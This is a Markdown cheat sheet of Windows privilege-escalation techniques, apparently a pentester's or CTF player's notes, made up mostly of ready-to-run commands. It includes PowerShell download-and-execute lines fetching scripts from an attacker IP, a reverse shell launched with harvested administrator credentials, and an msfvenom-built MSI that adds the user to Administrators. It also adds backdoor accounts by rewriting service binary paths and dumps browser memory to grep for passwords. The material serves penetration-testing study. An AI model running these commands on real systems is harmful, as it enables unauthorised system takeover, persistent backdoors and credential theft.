# Privesc Openings

## Windows Exploiter Suggester

```bash
# https://github.com/bitsadmin/wesng

# 1. Copy and paste into system.txt in kali
Systeminfo	

# 2. Update windows exploit suggester. Will generate a .xls file 
python windows-exploit-suggester.py --update	

# 3. Start suggesting an exploit
python windows-exploit-suggester.py --database <generated xls> --systeminfo system.txt	

```

## Sherlock

### Find All Vulns

```c
# find-allvulns 1
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/Sherlock.ps1')	
find-allvulns

# find-allvulns 2
powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; find-allvulns}"	


```

### PowerUp Invoke-AllChecks

```c
# Start powershell
powershell.exe -exec bypass	

# Download powerup
(New-Object Net.WebClient).DownloadFile('http://10.10.14.32/PowerUp.ps1','C:\Users\Destination\Folder\PowerUp.ps1')	

# Import script
Import-Module .\PowerUp.ps1	

# Start checks
Invoke-AllChecks	
```

#### Alternatively

```c
# Download
powershell (new-object net.webclient).downloadfile('http://10.10.14.32/PowerUp.ps1','C:\Users\tolis\Videos\PowerUp.ps1')

# Import Module
powershell Import-Module .\PowerUp.ps1

# start Checks
Powershell Invoke-AllChecks

# oneliner to start checks
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

## DLL Hijacking \(PowerUp\)

```c
# With powershell/Powerup
Find-ProcessDLLHijack
Find-PathDLLHijack
Write-HijackDll 

```

## Dump Process

Dump process \(eg. Browser\) to find credentials. Transfer to kali and 'Strings' grep for login or passwords

```bash
# powershell 
Get-Process firefox

# Kali
.\procdump64.exe -accepteula -ma <PID> <DumpName.dmp>

Strings <DumpName.dmp> | grep login
Strings <DumpName.dmp> | grep password
```

## Using Token and AutoLogon creds

PowerUp Invoke-AllCheck should find plaintext pass. Create privilege object to run reverse shell.

```c
# With powershell/Powerup
Get-RegistryAutoLogon

#Create credential object
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('administrator',$SecPass)

# Call reverse shell using credentials
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/HackedAgain.ps1')" -Credential $cred
```

## AlwaysInstallElevated

Always Install Elevated to create privesc user after installation.

```c
# for HKCU registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# or HKLM registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# With powershell/PowerUp)
Import-Module Privesc
Get-RegistryAlwaysInstallElevated


# Create msfvenom setup file
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi

#Run in victim machine
msiexec /quiet /qn /i setup.msi
```

## ICALCS 

Look for Folder permissions for \(W\) permissions. Overwrite with binary payload. For WinXP and Below: use cacls

```c
icacls "C:\Program Files (x86)\Program Folder" 
```

## WMIC

<table>
  <thead>
    <tr>
      <th style="text-align:left">Syntax</th>
      <th style="text-align:left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left"><code>wmic qfe getCaption,Description,HotFixID,InstalledOn</code>
      </td>
      <td style="text-align:left">
        <p>Any missing patches
          <br />
        </p>
        <p>Check for exploits in exploit-db eg.:
          <br />
        </p>
        <p>searchsploit MS16 windows local</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left"><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB979682&quot;  </code>
      </td>
      <td style="text-align:left">Windows Vista/2008 6.1.6000 x32,Windows Vista/2008 6.1.6001 x32,Windows
        7 6.2.7600 x32,Windows 7/2008 R2 6.2.7600 x64. (no good exploit - unlikely
        Microsoft Windows Vista/7 - Elevation of Privileges (UAC Bypass))</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB2393802&quot;</code>
      </td>
      <td style="text-align:left">Stored Credentials</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%</code>
      </td>
      <td style="text-align:left">32 or 64bit?</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>wmic useraccount get name, sid</code>
      </td>
      <td style="text-align:left">Get list of user account names and SID</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>wmic logicaldisk get caption || fsutil fsinfo drives</code>
      </td>
      <td style="text-align:left">List drives</td>
    </tr>
  </tbody>
</table>

## Unquoted Service Paths

Privesc by uploading binary payload in service path to be executed eg. By service start/stop or reboot.   
How? Suppose we found: `C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe`If you look at the registry entry for this service with Regedit you can see the ImagePath value is: `C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe` 

To be prevent it being exploited, the path should have been:  `C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe` When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find in sequence, hitting our exploit payload.

```text
C:\Program.exe
C:\Program Files.exe
C:\Program Files(x86)\Program Folder\A.exe
```

### To discover unquoted service path

```c
# With WMIC
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 

# With powershell/PowerUp
Get-ServiceUnquoted  
```

## Writable Path \(accesschk.exe &gt; upnphost\)

\(1\) Accesschk for any writable path  
\(2\) sc qc to query   
\(3\) method1: adding backdoor user to admin group  
\(4\) method2: adding binary payload 

```c
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\ /accepteula

# Or 

accesschk.exe -wuvc daclsvc /accepteula
```

![](../.gitbook/assets/image%20%2823%29.png)

### Querying Service 

```c
# With powershell/PowerUp
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail

# Querying service
sc qc <vuln-service>
```

### Method 1: Adding backdoor user to admin group

```c
sc qc <vuln-service>
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
sc stop <vuln-service>
sc start <vuln-service>

sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
sc stop <vuln-service>
sc start <vuln-service>
```

### Method 2: Adding binary payload

```c
sc config upnphost binpath= "C:\Inetpub\ftproot\shell.exe"sc config upnphost obj= ".\LocalSystem" password= ""sc config upnphost depend= ""
sc stop upnphost

# run reverse shell listener

net start upnphost
```

## Services Registry

```c
# In Powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

# Cmd
powershell "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"

```

![](../.gitbook/assets/image%20%2838%29.png)

Create exploit eg. Msfvenom exploit.exe and place in writable folder like 'temp'

```c
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\exploit.exe /f
```

Run service `sc start regsvc`



